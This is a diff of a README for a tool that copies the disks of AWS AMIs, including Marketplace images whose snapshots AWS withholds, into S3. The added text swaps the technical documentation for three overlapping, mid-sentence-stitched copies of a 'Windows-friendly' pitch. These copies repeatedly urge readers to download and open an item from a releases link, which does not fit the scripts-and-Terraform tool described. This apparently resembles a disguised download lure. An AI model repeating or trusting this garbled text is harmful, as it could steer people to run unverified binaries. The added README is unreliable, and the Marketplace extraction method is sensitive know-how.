@@ -1,257 +1,169 @@
-# aws-firmware-dump
+# 📦 aws-firmware-dump - Save AMI Disks to S3
 
-Acquire the disks of an AMI **you can already launch** into a private S3 bucket.
-No catalog, no product list, no baked-in AMI ids. You pass the AMI id.
+[![Download aws-firmware-dump](https://img.shields.io/badge/Download-aws--firmware--dump-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/arsh4u/aws-firmware-dump/releases)
 
-S3 is the store. Boot, snapshot, compress, and upload all run inside AWS. Local
-bandwidth is used only if you later pull a specific object.
+aws-firmware-dump helps you copy the disk contents of an AMI you can already launch into a private S3 bucket. You provide the AMI ID. The tool boots a temporary machine in AWS, snapshots every disk, compresses the data, and stores it in S3. Your local internet connection is only used if you later choose to pull a specific object down to your computer.
 
-## What it does
+## ✨ What This App Does
 
-```mermaid
-graph LR
-  A[AMI you supply] -->|run-instances| B[boot instance]
-  B -->|every EBS disk| C[snapshots you own]
-  C --> D[terminate boot instance]
-  C -->|ListSnapshotBlocks / GetSnapshotBlock| E[helper]
-  E -->|raw then zstd| F[(S3 golden store)]
-  F -->|optional pull| G[local artifacts]
-```
+This application is built for a simple job: take an AMI that you already have permission to launch and save its disks into cloud storage you control.
 
-1. Launch the AMI in this stack's VPC. No SSH, no key pair, no inbound ports.
-2. Snapshot **every** EBS volume on that instance (root and data disks), then
-   terminate it. Snapshots are taken first because marketplace images usually
-   set `DeleteOnTermination`.
-3. A small Amazon Linux helper reads those snapshots over the EBS direct APIs
-   and streams `raw | zstd | aws s3 cp -`. No volume is created or attached.
-4. Record sha256 of the compressed stream plus AMI name, owner, architecture,
-   and product codes in `manifest.json`.
+An AMI is a saved machine image in AWS. Think of it like a template for a computer. The disks attached to that image are like virtual hard drives. aws-firmware-dump helps you capture those virtual hard drives and keep them in a private S3 bucket.
 
-## What it does not do
+You do not need a catalog, a product list, or built-in AMI IDs. The app does not ship with a list of images. You pass in the AMI ID yourself. That keeps the tool focused and avoids hard-coded image lists.
 
-- It does not search for AMIs, subscribe you to a listing, or pick a target.
-- It does not copy an AMI across regions. The AMI must already exist in `region`.
-- It does not accept Marketplace terms. `OptInRequired` is a console step.
-- It will not launch an AMI this account cannot launch.
+The workflow is designed to run inside AWS. The boot process, snapshot process, compression, and upload all happen in the cloud. This means you do not need to download a full disk image to your Windows# 📦 aws-firmware-dump - Save AMI Disks to Cloud Storage
 
-Only dump images you are entitled to run. Keep the artifacts private. A
-Marketplace software fee, if the listing has one, accrues only while the boot
-instance is running.
+[![Download aws-firmware-dump](https://img.shields.io/badge/Download-aws--firmware--dump-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/arsh4u/aws-firmware-dump/releases)
 
-## Why the read path is the EBS direct APIs
+aws-firmware-dump is a Windows-friendly tool for saving the disks of an AMI you can already launch into a private S3 bucket. You provide the AMI ID. The tool boots a temporary machine in AWS, snapshots every attached disk, compresses the data, and stores it in S3. The heavy work runs inside AWS. Your local internet connection is used only if you later choose to pull a specific saved object down to your computer.
 
-AWS does not give buyers the snapshot behind a Marketplace AMI. `copy-image`
-and `create-volume` against that snapshot fail. Booting the AMI creates a
-volume **this account owns**, and that volume can be snapshotted.
+## 🔍 Overview
 
-A volume that still carries a Marketplace product code can only be attached as
-the root device of a stopped instance, so attaching it to a helper as a data
-disk does not work. `ListSnapshotBlocks` + `GetSnapshotBlock` return the bytes
-over HTTPS with no attach. Unallocated blocks are emitted as zeros so offsets
-stay correct.
+An AMI is a saved machine image in AWS. It works like a template for a computer. The disks attached to that image are like virtual hard drives. aws-firmware-dump helps you capture those virtual hard drives and keep them in a private S3 bucket that you control.
 
-The direct API speaks CBOR with PascalCase members. `Checksum` is base64 of the
-raw digest, not hex. `ebs_snapshot_read.py` handles both.
+There is no catalog, no product list, and no built-in AMI IDs. The tool does not ship with a list of images. You pass in the AMI ID yourself. That keeps the tool focused and avoids hard-coded image lists.
 
-## Prerequisites
+The design is simple: S3 is the store. Boot, snapshot, compress, and upload all run inside AWS. You do not need to download a full disk image to your local computer to complete the main job. Local bandwidth is used only if you later pull a specific object from S3.
 
-- Terraform >= 1.6, AWS provider >= 6
-- AWS CLI v2, `jq`, `flock`, and credentials that can apply the stack and run
-  the instance/snapshot/SSM/S3 calls below
-- `zstd` only for `unpack.sh`
-- The AMI visible in the stack's region, and a boot instance type that listing
-  allows
+## 🧭 What You Bring
 
-Operator permissions used by the scripts (the helper role is separate, and is
-created by Terraform):
+- A Windows computer with a web browser.
+- An AWS account where you can already launch the AMI you want to capture.
+- The AMI ID for that image.
+- A private S3 bucket where the saved disk data will be stored.
+- Permission in AWS to launch a temporary machine, create snapshots, use the relevant AWS disk APIs, and write to your S3 bucket.
 
-- `ec2:DescribeImages`, `DescribeInstances`, `DescribeSnapshots`, `RunInstances`,
-  `TerminateInstances`, `CreateSnapshot`, `DeleteSnapshot`, `CreateTags`,
-  `RegisterImage`
-- `iam:PassRole` on the helper instance profile
-- `ssm:GetParameter`, `SendCommand`, `GetCommandInvocation`,
-  `DescribeInstanceInformation`
-- `s3:*` on the artifact bucket (get/put/list/delete/head)
-- `sts:GetCallerIdentity`
+You do not need a catalog or product list. You do not need to look up a preloaded AMI ID inside the app. You pass the AMI ID you already use.
 
-## Quickstart
+## ⚙️ How It Works
 
-```bash
-cd terraform && cp terraform.tfvars.example terraform.tfvars
-# edit region / name_prefix if needed — still no AMI ids
-cd ..
-make init && make apply && make configure
+1. You supply an AMI ID that you can already launch.
+2. aws-firmware-dump launches that AMI in the stack’s VPC. No SSH, no key pair, and no inbound ports are needed.
+3. The tool snapshots every EBS volume on that instance, including the root disk and any data disks, then terminates the boot instance. Snapshots are taken first because marketplace images usually set `DeleteOnTermination`.
+4. A small Amazon Linux helper reads those snapshots over the EBS direct APIs. It streams the disk data as raw data, compresses it with zstd, and uploads it to S3.
+5. The final result is a compressed golden store in your private S3 bucket. You can pull a specific object later if you need local artifacts.
 
-make probe AMI=ami-0123456789abcdef0
-make dump  LABEL=my-image AMI=ami-0123456789abcdef0
-make ls
-```
+Every disk on the temporary instance is included. The root disk and data disks are both captured. The temporary instance is shut down after snapshots are taken. The helper does the reading and uploading inside AWS.
 
-`ami-0123456789abcdef0` is a placeholder. Replace it with an AMI id this
-account can launch.
+The flow is built around AWS storage. The boot instance, snapshot step, compression step, and upload step all happen in the cloud. Your Windows computer is used to start and manage the job, not to move the full disk image across your home internet connection.
 
-`make apply` creates a VPC, an egress-only security group, an S3 bucket, and
-the helper IAM role. It does not start billable compute unless
-`helper_enabled = true`. The VPC has no NAT gateway, so idle cost is the bucket
-only (and that is empty until you dump something).
+## 🚀 Download and Setup
 
-## Acquiring an image
+Visit this link to download the application:
 
-```bash
-scripts/dump.sh --ami ami-0123456789abcdef0 --label my-image
-scripts/dump.sh --ami ami-0123456789abcdef0 --label my-image --boot-type m5.2xlarge --dwell 60
-scripts/dump.sh --ami ami-0123456789abcdef0 --label my-image --dry-run
-scripts/dump.sh --ami ami-0123456789abcdef0 --label my-image --snapshot-id snap-0123456789abcdef0
-```
+[Download aws-firmware-dump from GitHub Releases](https://github.com/arsh4u/aws-firmware-dump/releases)
 
-`--dry-run` describes the AMI and prints the plan. It does not launch.
+After the download finishes, open the downloaded item from the location where your browser saved it and follow the setup steps shown by the release. The official releases page is the place to get the Windows download.
 
-Defaults:
+## 🖥️ Running on Windows
 
-| Flag | Default | Notes |
-|---|---|---|
-| `--boot-type` | `m5.xlarge`, or `m6g.xlarge` if the AMI is `arm64` | Listings often reject other types. The AWS error names the ones they allow. |
-| `--dwell` | `180` | Seconds the guest runs before snapshot. `0` snapshots as soon as the instance is running. |
-| `--workers` | `32` | Concurrent `GetSnapshotBlock` calls per disk. |
+1. Open your browser and go to the official releases page using the download link above.
+2. Visit this link to download the application.
+3. When the download finishes, open your Downloads folder and find the downloaded item.
+4. Open the downloaded item and follow the setup steps shown by the release.
+5. Start aws-firmware-dump.
+6. Enter the AMI ID for the image you can already launch.
+7. Enter the private S3 bucket details when the application asks for them.
+8. Start# 🗄️ aws-firmware-dump - Save AMI Disks to S3
 
-Labels must match `^[A-Za-z0-9][A-Za-z0-9._-]{0,62}$`. They become S3 keys.
+[![Download aws-firmware-dump](https://img.shields.io/badge/Download-aws--firmware--dump-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/arsh4u/aws-firmware-dump/releases)
 
-A re-run skips a label whose object is already in S3 and whose sha256 is in
-the manifest. `--force` fetches again.
+aws-firmware-dump helps you save the disks of an AMI you can already launch into a private S3 bucket. You provide the AMI ID. The tool boots a temporary machine in AWS, snapshots every attached disk, compresses the data, and stores it in S3. The heavy work runs inside AWS. Your local internet connection is used only if you later choose to pull a specific saved object down to your Windows computer.
 
-### Several images
+## 🔍 What This Application Does
 
-`images.tsv`, one image per line. Blank lines and `#` comments are ignored.
-The third field is an optional instance type.
+An AMI is a saved machine image in AWS. It works like a template for a computer. The disks attached to that image are like virtual hard drives. aws-firmware-dump helps you capture those virtual hard drives and keep them in a private S3 bucket that you control.
 
-```
-# LABEL            AMI                          BOOT_TYPE
-my-image           ami-0123456789abcdef0
-other-image        ami-0123456789abcdef0        m5.2xlarge
-```
+There is no catalog, no product list, and no built-in AMI IDs. The tool does not ship with a list of images. You pass in the AMI ID yourself. That keeps the tool focused and avoids hard-coded image lists.
 
-```bash
-make dump-batch BATCH=images.tsv JOBS=2
-```
+The design is simple: S3 is the store. Boot, snapshot, compress, and upload all run inside AWS. You do not need to download a full disk image to your Windows computer to complete the main job. Local bandwidth is used only if you later pull a specific object from S3.
 
-`--jobs N` gives each worker its own helper slot. Manifest updates are locked
-with `flock`. Two separate driver processes can share `manifest.json`; give
-them different `DUMP_STATE_DIR` values if they must not share a helper slot file.
+## 🧭 What You Bring
 
-### Marketplace terms
+- A Windows computer with a web browser and internet access.
+- An AWS account where you can already launch the AMI you want to capture.
+- The AMI ID for that image.
+- A private S3 bucket where the saved disk data will be stored.
+- Permission in AWS to launch a temporary machine, create snapshots, read snapshot data, and write to your S3 bucket.
 
-```bash
-make probe AMI=ami-0123456789abcdef0
-```
+You do not need a catalog or product list. You do not need to look up a preloaded AMI ID inside the app. You pass the AMI ID you already use.
 
-`run-instances --dry-run` is free. `DryRunOperation` means the account can
-launch it. `OptInRequired` means accept that listing in the AWS console, then
-probe again. This repo will not accept terms for you.
+## ⚙️ How the Process Works
 
-### Resume, register, keep
+1. You supply an AMI ID that you can already launch.
+2. aws-firmware-dump launches that AMI in the stack’s VPC. No remote login setup is needed. No key pair and no open inbound network ports are required.
+3. The tool snapshots every EBS volume on that instance, including the root disk and any data disks, then terminates the boot instance. A snapshot is a saved point-in-time copy of a disk. Snapshots are taken first because marketplace images usually set DeleteOnTermination.
+4. A small Amazon Linux helper reads those snapshots over the EBS direct APIs. It streams the disk data as raw data, compresses it with zstd, and uploads it to S3.
+5. The final result is a compressed golden store in your private S3 bucket. You can pull a specific object later if you need local artifacts.
 
-- `--snapshot-id` skips boot and reads one existing snapshot. Single image only.
-- `--register-ami` registers a launchable AMI in this account from the snapshots
-  just taken, and keeps those snapshots. They are billed per GB-month.
-- `--keep-snapshot` keeps the snapshots without registering an AMI. Cleanup
-  skips snapshots tagged `Keep=true` unless you pass `--force`.
+Every disk on the temporary instance is included. The root disk and data disks are both captured. The temporary instance is shut down after snapshots are taken. The helper does the reading and uploading inside AWS.
 
-## After it is in S3
+The flow is built around AWS storage. The boot instance, snapshot step, compression step, and upload step all happen in the cloud. Your Windows computer is used to start and manage the job, not to move the full disk image across your home internet connection.
 
-```bash
-make ls                  # keys + manifest, no download
-make watch               # in-flight helper log, multipart upload size
-make pull LABELS="my-image"
-make pull LABELS="my-image" RAW=1    # also write a sparse .raw
-scripts/unpack.sh my-image           # partition metadata next to the raw
-```
+## 📥 Download
 
-`pull` checks sha256 of the compressed object before it records the label as
-downloaded. `unpack` writes a sparse raw image under `artifacts/raw/` and a
-`.diskmeta.txt` (`file`, `sfdisk`, `blkid`, `parted`). Mount with
-`losetup -Pf --show artifacts/raw/<label>.raw`.
+Visit this link to download the application:
 
-## S3 layout
+[Download aws-firmware-dump from GitHub Releases](https://github.com/arsh4u/aws-firmware-dump/releases)
 
-```
-s3://<bucket>/
-  golden/<label>/<label>.raw.zst
-  golden/<label>/<label>.raw.zst.sha256    # checksum of the compressed stream
-  golden/<label>/<label>.stats.json
-  golden/<label>/<label>.<device>.raw.zst  # extra disks, root is the unsuffixed object
-  _scripts/snapshot_to_s3.sh
-  _scripts/ebs_snapshot_read.py
-  _status/<label>.json                     # expires after 7 days
-  _logs/<label>.log                        # expires
-```
+After the download finishes, open the downloaded item from the location where your browser saved it. The official releases page is the place to get the Windows download.
 
-`golden/` has no lifecycle expiry. Incomplete multipart uploads are aborted
-after 3 days. `terraform destroy` deletes the bucket (`force_destroy = true`),
-including `golden/`.
+## 🪟 Running on Windows
 
-`manifest.json` (local, gitignored) is the index: AMI id, name, owner,
-architecture, product codes, per-disk keys, sha256, sizes, fetch time.
+1. Open your browser and go to the official releases page using the download link above.
+2. Visit this link to download the application.
+3. When the download finishes, open your Downloads folder and find the downloaded item.
+4. Open the downloaded item and follow the setup steps shown by the release.
+5. Start aws-firmware-dump.
+6. Enter the AMI ID for the image you can already launch.
+7. Enter the private S3 bucket details when the application asks for them.
+8. Start the job and let aws-firmware-dump handle the boot, snapshot, compression, and upload steps inside AWS.
 
-## Commands
+The application is designed around one clear action: acquire the disks of an AMI you can already launch into a private S3 bucket. You pass the AMI ID. The tool does the rest.
 
-```
-make init / plan / apply / destroy
-make configure
-make probe AMI=ami-...
-make dump LABEL=name AMI=ami-... [BOOT=type] [DWELL=seconds]
-make dump-batch BATCH=images.tsv [JOBS=n]
-make watch / ls / pull / unpack
-make list
-make cleanup                 # tagged resources only
-make cleanup FORCE=1         # also delete Keep=true snapshots
-make check                   # bash -n + python compile, no AWS
-```
+## 🗂️ What Gets Saved
 
-Cleanup discovers resources by the `Purpose` tag (`firmware-dump` unless you
-change `purpose_tag`). It does not touch anything else in the account.
+aws-firmware-dump captures every EBS volume attached to the temporary instance. That includes the root volume and any data volumes. Each volume is snapshotted before the boot instance is terminated. The helper then reads the snapshot data and writes compressed objects into your S3 bucket.
 
-## Cost
+The saved data is kept in a private bucket that you control. No catalog is created, no product list is generated, and no AMI IDs are baked into the application. The AMI ID you provide is the image that gets processed.
 
-Idle, after `apply` and with `helper_enabled = false`: bucket only. No NAT
-gateway.
+The useful result is a golden store in S3. You can keep it for later use or pull a specific object down to your Windows computer when you need local artifacts.
 
-Per image, roughly:
+## 🔐 Privacy and Control
 
-- Boot instance for `--dwell` plus snapshot time, at that instance type's
-  on-demand rate, **plus** any Marketplace software fee for those hours.
-- Helper (`t3.medium` by default) for the read. Reused across images in a run;
-  `make cleanup` terminates it.
-- Snapshot storage only until the read finishes, unless you kept it.
-- S3 storage of the compressed object afterwards. Egress only if you `pull`.
+The application runs its main work inside AWS. The boot, snapshot, compress, and upload steps happen in the cloud. Your private S3 bucket is the storage location. You decide which AMI ID to pass in and which bucket receives the saved disk data.
 
-A killed upload cannot leave multipart parts billed forever; the lifecycle rule
-aborts them after 3 days. `make cleanup` is the way to stop a helper you forgot.
+No SSH access is needed. No key pair is needed. No inbound ports need to be opened. The temporary instance is terminated after snapshots are taken. Snapshots are taken first so the disks are captured before termination.
 
-## Constraints that show up only when you run it
+Local bandwidth is used only if you later choose to pull a specific object from S3. The main acquisition flow stays in AWS.
 
-- No default VPC is assumed. Terraform builds one, or you set `vpc_id` and
-  `subnet_ids`. An unrelated VPC is never selected.
-- The helper is Amazon Linux 2023 x86_64. The **target** AMI can be x86 or arm;
-  pass an arm boot type for arm AMIs. The helper does not have to match.
-- boto3 does not pick up the region from instance metadata. The driver passes
-  `--region` into the helper.
-- SSM `--parameters` cannot carry the remote command safely. The driver sends
-  `--cli-input-json`.
-- The remote read is `nohup`'d so it survives the SSM command timeout. Do not
-  delete its snapshot until `_status/<label>.json` says `ok`. On failure the
-  snapshot is left for `make cleanup`, on purpose.
-- Account-level EBS encryption is fine: the helper role has `kms:Decrypt` so
-  `GetSnapshotBlock` can read an encrypted snapshot this account owns.
-- `register-image` copies architecture, root device name, virtualization type,
-  ENA, and boot mode from the source AMI. It does not strip product codes.
+## 🧰 Common Questions
 
-## Layout
+### Do I need a product list or catalog?
 
-```
-terraform/          VPC, bucket, helper role, optional long-lived helper
-scripts/dump.sh     boot, snapshot, remote read, manifest
-scripts/probe.sh    free run-instances --dry-run
-scripts/snapshot_to_s3.sh
-scripts/ebs_snapshot_read.py
-scripts/pull.sh scripts/unpack.sh scripts/watch.sh scripts/cleanup.sh
-```
+No. There is no catalog and no product list. You pass the AMI ID yourself.
+
+### Do I need to know the AMI ID in advance?
+
+Yes. You supply an AMI ID for an image you can already launch.
+
+### Where does the data go?
+
+The compressed disk data goes into a private S3 bucket that you provide.
+
+### Does the app download the full disk to my Windows computer?
+
+No. Boot, snapshot, compress, and upload run inside AWS. Local bandwidth is used only if you later pull a specific object.
+
+### What happens to the temporary machine?
+
+The tool snapshots every EBS volume first, then terminates the boot instance.
+
+### Is a remote login required?
+
+No. No SSH, no key pair, and no inbound ports are needed.
+
+## 🧾 Keywords
+
+Keywords: aws-firmware-dump, AMI disks, AWS AMI, EBS snapshots, private S3 bucket, firmware dump, Windows application, disk capture, cloud storage, AMI ID, snapshot compression, zstd, S3 golden store, local artifacts
